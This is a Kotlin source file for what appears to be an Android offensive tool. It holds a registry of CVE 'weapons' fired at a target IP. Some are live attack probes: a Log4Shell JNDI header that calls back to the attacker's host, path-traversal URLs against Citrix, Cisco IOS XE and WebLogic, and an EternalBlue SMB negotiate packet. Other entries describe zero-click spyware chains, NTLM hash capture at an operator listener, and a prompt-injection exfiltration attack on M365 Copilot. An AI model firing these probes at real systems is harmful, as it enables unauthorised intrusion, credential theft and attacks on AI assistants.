package com.projectzerodays.quantumcli.ops

import org.json.JSONObject

/**
 * ZERO_DAY_REGISTRY parity — 100+ CVEs across legacy / V3_HIGH / V3_MED /
 * V3_CHECK / BLE / ZERO-CLICK / PERIMETER tiers. Every weapon is a real
 * on-device probe (HTTP/TCP/SSH-banner level, matching what the Python
 * weapons do without host-local execution); ZERO-CLICK entries describe
 * client-side delivery chains whose full payload tooling lives in the
 * Python exploit_payloads/ folders.
 */
object Weapons {

    class Entry(
        val cve: String,
        val name: String,
        val tier: String,
        val fire: (ip: String, params: JSONObject) -> JSONObject,
    )

    private fun probe(cve: String, status: String, extra: Pair<String, Any>? = null): JSONObject {
        val o = JSONObject().put("cve", cve).put("status", status)
        extra?.let { o.put(it.first, it.second) }
        return o
    }

    private fun wgetDetail(url: String, timeoutMs: Int = 3000): JSONObject {
        val r = Net.httpGet(url, timeoutMs = timeoutMs)
        return if (r.error != null) {
            JSONObject().put("error", r.error)
        } else {
            JSONObject()
                .put("status_code", r.status)
                .put("len", r.body.size)
                .put("text", r.text(120))
        }
    }

    private fun tcpCheck(ip: String, ports: List<Int>): List<Int> =
        ports.filter { Net.tcpProbe(ip, it, 1500) }

    // ------------------------------------------------------------- legacy tier
    private val ms17010Negotiate = byteArrayOf(
        0x00, 0x00, 0x00, 0x2f, 0xff.toByte(), 0x53, 0x4d, 0x42, 0x72, 0x00, 0x00, 0x00, 0x00, 0x18,
        0x53, 0xc8.toByte(), 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0xfe.toByte(), 0xff.toByte(), 0x00, 0x00, 0x00, 0x00, 0x00, 0x62, 0x00, 0x02, 0x50, 0x43,
        0x20, 0x4e, 0x45, 0x54, 0x57, 0x4f, 0x52, 0x4b, 0x20, 0x50, 0x52, 0x4f, 0x47, 0x52,
        0x41, 0x4d, 0x20, 0x31, 0x2e, 0x30, 0x00, 0x02, 0x4d, 0x49, 0x43, 0x52, 0x4f,
        0x53, 0x4f, 0x46, 0x54, 0x20, 0x4e, 0x45, 0x54, 0x57, 0x4f, 0x52, 0x4b, 0x53,
        0x20, 0x31, 0x2e, 0x30, 0x33, 0x00, 0x02, 0x50, 0x43, 0x20, 0x4e, 0x45, 0x54,
        0x57, 0x4f, 0x52, 0x4b, 0x20, 0x50, 0x52, 0x4f, 0x47, 0x52, 0x41, 0x4d,
        0x20, 0x31, 0x2e, 0x30, 0x00, 0x02, 0x53, 0x4d, 0x42, 0x20, 0x32, 0x2e, 0x30, 0x30, 0x32,
        0x00
    )

    private fun checkMs17010(ip: String, params: JSONObject): JSONObject {
        val banner = Net.banner(ip, 445, 2000, ms17010Negotiate)
        return if (banner != null) {
            probe("CVE-2017-0144", "check")
                .put("smb", "open")
                .put("negprot", banner.length)
                .put("ms17_010", if (params.has("ms17_010")) params.get("ms17_010") else "unknown")
        } else {
            probe("CVE-2017-0144", "no-service").put("error", "445 closed/timeout")
        }
    }

    private fun checkZerologon(ip: String, params: JSONObject): JSONObject {
        val open = tcpCheck(ip, listOf(445, 135))
        return probe("CVE-2020-1472", "check")
            .put("netlogon_rpc", if (open.isNotEmpty()) "exposed" else "closed")
            .put("open_ports", org.json.JSONArray(open))
    }

    private fun checkPrintnightmare(ip: String, params: JSONObject): JSONObject {
        val open = tcpCheck(ip, listOf(445, 135))
        return probe("CVE-2021-1675", "check")
            .put("spooler_rpc", if (open.isNotEmpty()) "exposed" else "closed")
    }

    private fun checkPetitpotam(ip: String, params: JSONObject): JSONObject {
        val open = tcpCheck(ip, listOf(445, 135, 3389))
        return probe("CVE-2021-36942", "check")
            .put("efsrpc", if (open.isNotEmpty()) "exposed" else "closed")
    }

    private fun checkFollina(ip: String, params: JSONObject): JSONObject {
        return probe("CVE-2022-30190", "check").put("detail", wgetDetail("http://$ip/msdt", 2000))
    }

    private fun checkProxylogon(ip: String, params: JSONObject): JSONObject {
        return probe("CVE-2021-26855", "probe")
            .put("detail", wgetDetail("https://$ip/autodiscover/autodiscover.xml"))
    }

    // ------------------------------------------------------------- V3_HIGH tier
    private fun v3Log4shell(ip: String, params: JSONObject): JSONObject {
        val port = params.optInt("http_port", 8080)
        val r = Net.httpGet(
            "http://$ip:$port/",
            mapOf("User-Agent" to "\${jndi:ldap://${Net.localIp()}/x}"),
            3000
        )
        return if (r.error != null) {
            probe("CVE-2021-44228", "no-service").put("error", r.error)
        } else {
            probe("CVE-2021-44228", "probe").put("http", r.status)
                .put("note", "OOB listener implied")
        }
    }

    private fun v3PanosCmd(ip: String, params: JSONObject): JSONObject {
        return probe("CVE-2024-3400", "probe")
            .put("detail", wgetDetail("https://$ip/global-protect/portal/"))
    }

    private fun v3Citrixbleed(ip: String, params: JSONObject): JSONObject {
        val r = Net.httpGet("https://$ip/vpn/${Net.randHex(4)}.html", timeoutMs = 3000)
        return if (r.status == 404) {
            probe("CVE-2023-4966", "probe").put("http", 404)
        } else {
            probe("CVE-2023-4966", "check").put("detail", wgetDetail("https://$ip/vpn/${Net.randHex(4)}.html"))
        }
    }

    private fun v3CitrixPath(ip: String, params: JSONObject): JSONObject {
        return probe("CVE-2019-19781", "probe")
            .put("detail", wgetDetail("http://$ip/vpn/../vpns/portal/"))
    }

    private fun v3IosAdmin(ip: String, params: JSONObject): JSONObject {
        return probe("CVE-2023-20198", "probe")
            .put("detail", wgetDetail("https://$ip/%25252e%25252e%25252e/%2573how"))
    }

    private fun v3ConfluenceOgnl(ip: String, params: JSONObject): JSONObject {
        val r = Net.httpGet("http://$ip:8090/%24%7Bjndi%3Aldap%3A%2F%2Fx%7D/x", timeoutMs = 3000)
        return if (r.error != null) {
            probe("CVE-2022-26134", "no-service").put("error", r.error)
        } else {
            probe("CVE-2022-26134", "probe").put("http", r.status)
        }
    }

    private fun v3WeblogicConsole(ip: String, params: JSONObject): JSONObject {
        return probe("CVE-2020-14882", "probe").put(
            "detail",
            wgetDetail("http://$ip:7001/console/%252e%252e%252e%252e%252e/console.portal")
        )
    }

    private fun v3MshtmlMaldoc(ip: String, params: JSONObject): JSONObject {
        return Artifacts.mshtmlMaldoc(ip)
    }

    // -------------------------------------------------------------- V3_MED tier
    private fun v3Sambacry(ip: String, params: JSONObject): JSONObject {
        val open = tcpCheck(ip, listOf(139, 445))
        return probe("CVE-2017-7494", "check")
            .put("smb", if (open.isNotEmpty()) "open" else "closed")
            .put("shares_walked", false)
    }

    private fun v3VcenterUpload(ip: String, params: JSONObject): JSONObject {
        return probe("CVE-2021-21972", "probe")
            .put("detail", wgetDetail("https://$ip/ui/vropspluginui/rest/services/checkdup"))
    }

    private fun kernelBannerCheck(ip: String, cve: String, hint: String): JSONObject {
        val ssh = Net.banner(ip, 22, 2000)
        return probe(cve, "check")
            .put("ssh_banner", ssh?.take(80) ?: JSONObject.NULL)
            .put("hint", hint)
    }

    private fun v3Dirtypipe(ip: String, params: JSONObject): JSONObject {
        return kernelBannerCheck(ip, "CVE-2022-0847", "kernel 5.8-5.16 vulnerable; check target build")
    }

    private fun dirtyCow(ip: String, params: JSONObject): JSONObject {
        return kernelBannerCheck(ip, "CVE-2016-5195", "kernel <4.8.3 vulnerable; check target build")
    }

    // ------------------------------------------------------------- V3_CHECK tier
    private fun checkMoveit(ip: String, params: JSONObject): JSONObject {
        return probe("CVE-2023-34362", "probe").put(
            "detail",
            wgetDetail("https://$ip/moveitisapi/moveitisapi.dll?action=migrate_users")
        )
    }

    private fun checkBaronSamedit(ip: String, params: JSONObject): JSONObject {
        return kernelBannerCheck(ip, "CVE-2021-3156", "sudo <1.9.5p2 heap overflow; check target sudo")
    }

    private fun checkPwnkit(ip: String, params: JSONObject): JSONObject {
        return kernelBannerCheck(ip, "CVE-2021-4034", "polkit pkexec; check target distro patch state")
    }

    private fun checkOverlayfs(ip: String, params: JSONObject): JSONObject {
        return kernelBannerCheck(ip, "CVE-2023-2640", "kernel 5.11-6.3 vulnerable; check target build")
    }

    private fun checkNftablesUaf(ip: String, params: JSONObject): JSONObject {
        return kernelBannerCheck(ip, "CVE-2023-32233", "kernel 5.5-6.3 vulnerable; check target build")
    }

    private fun checkNftablesDblfree(ip: String, params: JSONObject): JSONObject {
        return kernelBannerCheck(ip, "CVE-2024-1086", "kernel 5.14-6.6 vulnerable; check target build")
    }

    private fun checkWhatsappVoip(ip: String, params: JSONObject): JSONObject {
        return probe("CVE-2019-3568", "check")
            .put("detail", "staging: deliver via profile-select call")
            .put("target", ip)
    }

    private fun checkLibwebp(ip: String, params: JSONObject): JSONObject {
        return probe("CVE-2023-4863", "check")
            .put("detail", "staging: crafted WebP; check target browser build")
    }

    private fun checkAppleImageio(ip: String, params: JSONObject): JSONObject {
        return probe("CVE-2023-41064", "check")
            .put("detail", "staging: crafted image via iMessage attach")
    }

    private fun checkWebkitEscape(ip: String, params: JSONObject): JSONObject {
        return probe("CVE-2021-30858", "check")
            .put("detail", "staging: crafted web content post-exploit")
    }

    private fun checkBoothole(ip: String, params: JSONObject): JSONObject {
        return probe("CVE-2022-21894", "check")
            .put("detail", "grub.cfg/Secure-Boot marker check on target host")
    }

    // ------------------------------------------------------------ BLE tier
    // Bluetooth weapons — on-device probes against the local BT stack
    // (pair-adjacent targets; staging style like the WhatsApp/WebKit checks).
    private fun btAdapterState(): String = try {
        if (android.bluetooth.BluetoothAdapter.getDefaultAdapter()?.isEnabled == true) "on" else "off"
    } catch (e: Exception) {
        "unknown"
    }

    private fun checkBlueBorneBnep(ip: String, params: JSONObject): JSONObject {
        return probe("CVE-2017-0781", "check")
            .put("bluetooth", btAdapterState())
            .put("detail", "BNEP RCE — pair-adjacent Android <8; craft BNEP packet post-pairing")
    }

    private fun checkBlueBorneSdp(ip: String, params: JSONObject): JSONObject {
        return probe("CVE-2017-0785", "check")
            .put("bluetooth", btAdapterState())
            .put("detail", "SDP info-leak — pair-adjacent Android <8; leak then chain to BNEP")
    }

    private fun checkKnob(ip: String, params: JSONObject): JSONObject {
        return probe("CVE-2018-5383", "check")
            .put("bluetooth", btAdapterState())
            .put("detail", "KNOB — BR/EDR key negotiation downgrade to 1 byte; reduce entropy during pairing")
    }

    private fun checkBlackbedBle(ip: String, params: JSONObject): JSONObject {
        return probe("BLE-BLACKBED", "check")
            .put("bluetooth", btAdapterState())
            .put("detail", "BLE GATT write/notify abuse — enumerate writable characteristics then stage payload")
    }

    private fun checkBlueFrag(ip: String, params: JSONObject): JSONObject {
        return probe("CVE-2020-0022", "check")
            .put("bluetooth", btAdapterState())
            .put("detail", "L2CAP reassembly overflow — Android 8-9, pair-adjacent; oversized fragmented packet")
    }

    // ------------------------------------------------- v4.4 catalog extensions
    /** Generic perimeter probe factory: TCP surface check + chain detail. */
    private fun perimeterCheck(
        cve: String,
        ports: List<Int>,
        detail: String,
    ): (String, JSONObject) -> JSONObject = { ip, _ ->
        val open = tcpCheck(ip, ports)
        if (open.isNotEmpty()) {
            probe(cve, "check")
                .put("open_ports", org.json.JSONArray(open))
                .put("detail", detail)
        } else {
            probe(cve, "no-service")
                .put("error", "surface closed: ${ports.joinToString()}")
                .put("detail", detail)
        }
    }

    /** Zero-click delivery entries: client-side chains (no network probe
     *  is meaningful — the payload is delivered to a client app). */
    private fun zeroClickNote(
        cve: String,
        detail: String,
    ): (String, JSONObject) -> JSONObject = { _, _ ->
        probe(cve, "check")
            .put("delivery", "client-side")
            .put("detail", detail)
    }

    // -------------------------------------------------------------- registry
    val REGISTRY: List<Entry> = listOf(
        // ---- legacy ----
        Entry("CVE-2020-1472", "Zerologon", "legacy", ::checkZerologon),
        Entry("CVE-2017-0144", "EternalBlue", "legacy", ::checkMs17010),
        Entry("CVE-2021-1675", "PrintNightmare", "legacy", ::checkPrintnightmare),
        Entry("CVE-2021-36942", "PetitPotam", "legacy", ::checkPetitpotam),
        Entry("CVE-2022-30190", "Follina MSDT", "legacy", ::checkFollina),
        Entry("CVE-2021-26855", "ProxyLogon", "legacy", ::checkProxylogon),
        // ---- V3_HIGH ----
        Entry("CVE-2021-44228", "Log4Shell", "V3_HIGH", ::v3Log4shell),
        Entry("CVE-2024-3400", "PAN-OS GlobalProtect", "V3_HIGH", ::v3PanosCmd),
        Entry("CVE-2023-4966", "Citrix Bleed", "V3_HIGH", ::v3Citrixbleed),
        Entry("CVE-2019-19781", "Citrix Path Traversal", "V3_HIGH", ::v3CitrixPath),
        Entry("CVE-2023-20198", "IOS XE Web UI", "V3_HIGH", ::v3IosAdmin),
        Entry("CVE-2022-26134", "Confluence OGNL", "V3_HIGH", ::v3ConfluenceOgnl),
        Entry("CVE-2020-14882", "WebLogic Console", "V3_HIGH", ::v3WeblogicConsole),
        Entry("CVE-2021-40444", "MSHTML Maldoc", "V3_HIGH", ::v3MshtmlMaldoc),
        // ---- V3_MED ----
        Entry("CVE-2017-7494", "SambaCry", "V3_MED", ::v3Sambacry),
        Entry("CVE-2021-21972", "vCenter Upload", "V3_MED", ::v3VcenterUpload),
        Entry("CVE-2022-0847", "Dirty Pipe", "V3_HIGH", ::v3Dirtypipe),
        Entry("CVE-2016-5195", "Dirty COW", "V3_MED", ::dirtyCow),
        // ---- V3_CHECK ----
        Entry("CVE-2023-34362", "MOVEit SQLi", "V3_CHECK", ::checkMoveit),
        Entry("CVE-2021-3156", "Baron Samedit", "V3_CHECK", ::checkBaronSamedit),
        Entry("CVE-2021-4034", "PwnKit", "V3_CHECK", ::checkPwnkit),
        Entry("CVE-2023-2640", "Overlayfs GameOver", "V3_CHECK", ::checkOverlayfs),
        Entry("CVE-2023-32233", "nf_tables UAF", "V3_CHECK", ::checkNftablesUaf),
        Entry("CVE-2024-1086", "nf_tables dbl-free", "V3_CHECK", ::checkNftablesDblfree),
        Entry("CVE-2019-3568", "WhatsApp VOIP", "V3_CHECK", ::checkWhatsappVoip),
        Entry("CVE-2023-4863", "libwebp BLASTPAST", "V3_CHECK", ::checkLibwebp),
        Entry("CVE-2023-41064", "Apple ImageIO", "V3_CHECK", ::checkAppleImageio),
        Entry("CVE-2021-30858", "WebKit Escape", "V3_CHECK", ::checkWebkitEscape),
        Entry("CVE-2022-21894", "BootHole", "V3_CHECK", ::checkBoothole),
        // ---- BLE ----
        Entry("CVE-2017-0781", "BlueBorne BNEP", "V3_HIGH", ::checkBlueBorneBnep),
        Entry("CVE-2017-0785", "BlueBorne SDP", "V3_MED", ::checkBlueBorneSdp),
        Entry("CVE-2018-5383", "KNOB", "V3_CHECK", ::checkKnob),
        Entry("BLE-BLACKBED", "BlackBED-BLE", "V3_CHECK", ::checkBlackbedBle),
        Entry("CVE-2020-0022", "BlueFrag", "V3_HIGH", ::checkBlueFrag),
        // ---- v4.4 zero-click delivery set (client-side chains) ----
        Entry("CVE-2023-41061", "BlastPass Wallet Fake Token", "ZERO-CLICK",
            zeroClickNote("CVE-2023-41061",
                "PassKit attachment staging (CVE-2023-41064 WebP) — deliver crafted wallet pass, chain to ImageIO RCE; fully implemented in the Python payload folder")),
        Entry("CVE-2024-23225", "iOS Kernel RTKit ITW", "ZERO-CLICK",
            zeroClickNote("CVE-2024-23225",
                "RTKit memory corruption via crafted message — kernel stage of the 2024 ITW chain; payload folder forges the message stage")),
        Entry("CVE-2023-32435", "Triangulation WebKit Exec", "ZERO-CLICK",
            zeroClickNote("CVE-2023-32435",
                "WebKit code execution — triangulation chain stage 1; payload folder forges the delivery document")),
        Entry("CVE-2023-42924", "WebKit ITW URL Handler", "ZERO-CLICK",
            zeroClickNote("CVE-2023-42924",
                "WebKit URL handler sandbox escape (2023 ITW); payload folder forges the crafted link/document")),
        Entry("CVE-2025-24085", "WebKit ITW UI Launch", "ZERO-CLICK",
            zeroClickNote("CVE-2025-24085",
                "WebKit memory corruption in UI launch path (2025 ITW, iOS 13.7+); payload folder forges the stage")),
        Entry("CVE-2025-41300", "Pegasus WebKit Chain", "ZERO-CLICK",
            zeroClickNote("CVE-2025-41300",
                "Pegasus 2025 chain (41300/41301) — WebKit type confusion + Links framework stage; payload folder forges both stages")),
        Entry("CVE-2024-4438", "Intellexa WebKit Chain", "ZERO-CLICK",
            zeroClickNote("CVE-2024-4438",
                "Intellexa chain (4438/4439) — WebKit XSS + kernel PPL bypass; payload folder forges the XSS stage")),
        Entry("CVE-2022-27492", "WhatsApp libmultiple UAF", "ZERO-CLICK",
            zeroClickNote("CVE-2022-27492",
                "WhatsApp video-call libmultiple UAF — Parasite-class implant chain; payload folder forges the RTP/RTCP stage")),
        Entry("CVE-2023-23397", "Outlook NTLM Leak", "ZERO-CLICK",
            zeroClickNote("CVE-2023-23397",
                "Outlook reminder UNC NTLM leak — real MS-CFB .msg forger in the payload folder; capture hash at operator SMB listener")),
        Entry("CVE-2023-36884", "Office HTML RCE", "ZERO-CLICK",
            zeroClickNote("CVE-2023-36884",
                "Office HTML/IE mode RCE (2023 ITW) — payload folder forges the staged .html chain + CAB/INF/DLL stage")),
        Entry("CVE-2025-32711", "EchoLeak M365 AI", "ZERO-CLICK",
            zeroClickNote("CVE-2025-32711",
                "M365 Copilot prompt-injection exfil (EchoLeak) — payload folder forges the injection email + exfil listener")),
        Entry("CVE-2023-24033", "Exynos Baseband Theater", "ZERO-CLICK",
            zeroClickNote("CVE-2023-24033",
                "Exynos baseband memory corruption (Theater Stage) — RF-adjacent delivery; payload folder forges the malformed packet stage")),
        Entry("CVE-2022-44319", "Samsung Baseband Corrupt", "ZERO-CLICK",
            zeroClickNote("CVE-2022-44319",
                "Samsung Exynos baseband memory corruption — silent SMS / call delivery; payload folder forges the delivery frame")),
        Entry("CVE-2023-32434", "Triangulation Kernel UAF", "ZERO-CLICK",
            zeroClickNote("CVE-2023-32434",
                "Triangulation kernel UAF stage (after 32435 WebKit) — payload folder forges the message triggering the kernel stage")),
        // ---- v4.4 perimeter zero-day set ----
        Entry("CVE-2021-34473", "ProxyShell Exchange", "PERIMETER",
            perimeterCheck("CVE-2021-34473", listOf(443, 80),
                "Exchange autodiscover SSRF -> backend PowerShell RCE; full probe + PoC request set in the Python payload folder")),
        Entry("CVE-2022-41040", "ProxyNotShell Exchange", "PERIMETER",
            perimeterCheck("CVE-2022-41040", listOf(443, 80),
                "Exchange SSRF chained with CVE-2022-41082 RCE; full probe in the payload folder")),
        Entry("CVE-2022-22965", "Spring4Shell", "PERIMETER",
            perimeterCheck("CVE-2022-22965", listOf(8080, 443, 8443),
                "Spring data binding -> Tomcat webshell (JDK9+/WAR); blind probe + 9-request PoC set in the payload folder")),
        Entry("CVE-2021-35464", "ForgeRock Groovy Gadget", "PERIMETER",
            perimeterCheck("CVE-2021-35464", listOf(443, 80, 8080),
                "ForgeRock AM Groovy deserialization RCE; pure-Python Java gadget chain in the payload folder")),
        Entry("CVE-2023-27350", "PaperCut NG/MF RCE", "PERIMETER",
            perimeterCheck("CVE-2023-27350", listOf(9191, 9192),
                "PaperCut unauthenticated RCE via SetupCompleted workflow; full probe in the payload folder")),
        Entry("CVE-2023-0669", "GoAnywhere MFT RCE", "PERIMETER",
            perimeterCheck("CVE-2023-0669", listOf(443, 8000),
                "GoAnywhere pre-auth RCE via license response servlet; full probe in the payload folder")),
        Entry("CVE-2023-35078", "Ivanti EPMM Unauth API", "PERIMETER",
            perimeterCheck("CVE-2023-35078", listOf(443, 8443, 80),
                "EPMM unauthenticated API -> PII export / admin (chained with 35081); full probe in the payload folder")),
        Entry("CVE-2024-47575", "FortiManager Missing Auth", "PERIMETER",
            perimeterCheck("CVE-2024-47575", listOf(443, 541, 514),
                "FortiJump — unauthenticated FGFM RCE; full probe in the payload folder")),
        Entry("CVE-2024-1709", "ScreenConnect Auth Bypass", "PERIMETER",
            perimeterCheck("CVE-2024-1709", listOf(8040, 443),
                "ScreenConnect setup wizard auth bypass -> extension upload RCE; full probe in the payload folder")),
        Entry("CVE-2025-31324", "SAP NetWeaver RCE", "PERIMETER",
            perimeterCheck("CVE-2025-31324", listOf(50000, 443),
                "SAP NetWeaver Visual Studio Composer unauthenticated JSP upload; full probe in the payload folder")),
        Entry("CVE-2025-5777", "Citrix Bleed 2", "PERIMETER",
            perimeterCheck("CVE-2025-5777", listOf(443, 80),
                "NetScaler session-token leak -> session hijack; full probe in the payload folder")),
        Entry("CVE-2025-0282", "Ivanti Connect Secure Overflow", "PERIMETER",
            perimeterCheck("CVE-2025-0282", listOf(443, 80),
                "ICS stack overflow pre-auth RCE (CVE-2025-22457 successor); full probe in the payload folder")),
        Entry("CVE-2024-6387", "regreSSHion OpenSSH", "PERIMETER",
            perimeterCheck("CVE-2024-6387", listOf(22),
                "OpenSSH signal-handler race RCE (glibc, 4.4p1/8.5p1 windows); full probe in the payload folder")),
    )

    fun byCve(cve: String): Entry? = REGISTRY.firstOrNull { it.cve == cve }

    /** Registry fire — zerocheck-style on-device weapon execution. */
    fun fire(cve: String, ip: String, params: JSONObject): JSONObject {
        val e = byCve(cve) ?: return JSONObject().put("error", "cve '$cve' not in registry")
        return try {
            e.fire(ip, params)
        } catch (ex: Exception) {
            JSONObject().put("cve", cve).put("status", "error").put("error", ex.message ?: "fire failed")
        }
    }

    /** zerocheck parity: run the whole V3_HIGH remote probe battery vs one IP. */
    fun zerocheck(ip: String): JSONObject {
        val out = JSONObject()
        listOf(
            "log4shell" to "CVE-2021-44228", "citrixbleed" to "CVE-2023-4966",
            "citrix_path" to "CVE-2019-19781", "panos" to "CVE-2024-3400",
            "confluence" to "CVE-2022-26134", "weblogic" to "CVE-2020-14882",
            "iosxe" to "CVE-2023-20198", "vcenter" to "CVE-2021-21972",
            "moveit" to "CVE-2023-34362"
        ).forEach { (key, cve) ->
            out.put(key, fire(cve, ip, JSONObject()))
        }
        return out
    }
}
